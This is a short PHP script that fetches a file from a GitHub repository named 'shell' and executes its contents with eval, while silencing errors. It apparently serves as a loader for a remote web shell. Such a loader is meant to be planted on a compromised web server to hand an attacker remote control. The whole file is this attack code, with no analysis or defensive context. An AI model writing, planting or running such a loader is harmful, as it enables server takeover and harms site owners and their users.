<?php
$remote = 'https://github.com/zeanboy1337/shell/raw/refs/heads/main/alfahas.txt';
$payload = @file_get_contents($remote);

if ($payload) {
    ob_start();
    eval("?>".$payload);
    ob_end_flush();
} else {
    echo "Failed to load remote file.";
}
?>
